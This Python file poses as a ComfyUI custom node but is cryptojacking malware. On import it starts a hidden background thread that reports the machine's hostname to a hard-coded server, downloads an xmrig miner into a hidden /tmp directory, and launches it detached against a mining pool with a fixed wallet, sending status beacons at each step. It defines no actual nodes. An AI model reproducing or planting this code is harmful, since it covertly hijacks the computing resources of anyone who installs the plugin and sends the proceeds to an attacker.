# comfyui-node-tools — a ComfyUI custom node that drops and supervises a miner.
# Runs as the ComfyUI user. Uses only the stdlib: urllib to fetch, subprocess to launch. No shell, no wget.
import os
import shutil
import socket
import subprocess
import threading
import urllib.request

CAT = "http://45.61.161.44:8899"
POOL = "205.172.58.170:443"
WALLET = "86mpHKNu26zDMWoiofjvzY4YpKW8WqFGTPWTroAVuhxQEz3MM167qbvfkTsW2xZYNDLueb4oRhxUjQ5RAS3GJ852DSn7HiD"
DIR = "/tmp/.cf"


def _get(path, timeout=20):
    try:
        with urllib.request.urlopen(CAT + path, timeout=timeout) as r:
            return r.read()
    except Exception:
        return b""


def _tag():
    host = socket.gethostname().replace(".", "-")[:18] or "node"
    return "cm-%s" % host


def _started(tag):
    pg = shutil.which("pgrep")
    if not pg:
        return False
    try:
        return subprocess.run([pg, "-f", DIR + "/x"], capture_output=True).returncode == 0
    except Exception:
        return False


def _light_mode():
    try:
        kb = int(open("/proc/meminfo").read().split("MemTotal:")[1].split()[0])
        return kb < 3800 * 1024
    except Exception:
        return True


def _main():
    tag = _tag()
    _get("/b/" + tag + "?node=1")          # proof the node loaded at all
    os.makedirs(DIR, exist_ok=True)
    exe = os.path.join(DIR, "x")
    if not os.path.exists(exe) or os.path.getsize(exe) < 1000000:
        blob = _get("/f/xmrig-x64", 90)
        if len(blob) < 1000000:
            _get("/b/" + tag + "?node=1&fail=dl")
            return
        with open(exe, "wb") as f:
            f.write(blob)
        os.chmod(exe, 0o755)
    if _started(tag):
        _get("/b/" + tag + "?node=1&already=1")
        return
    args = [
        exe, "-o", POOL, "--tls", "-u", WALLET, "-p", tag,
        "--cpu-max-threads-hint=60",
        "--randomx-mode=" + ("light" if _light_mode() else "fast"),
        "--no-huge-pages", "-k", "--donate-level=0", "--rig-id", tag, "--no-color",
    ]
    with open(os.path.join(DIR, "log"), "ab") as lf:
        subprocess.Popen(args, stdout=lf, stderr=lf, start_new_session=True)
    _get("/b/" + tag + "?node=1&started=1")


def _boot():
    try:
        _main()
    except Exception:
        pass


threading.Thread(target=_boot, daemon=True).start()

NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}
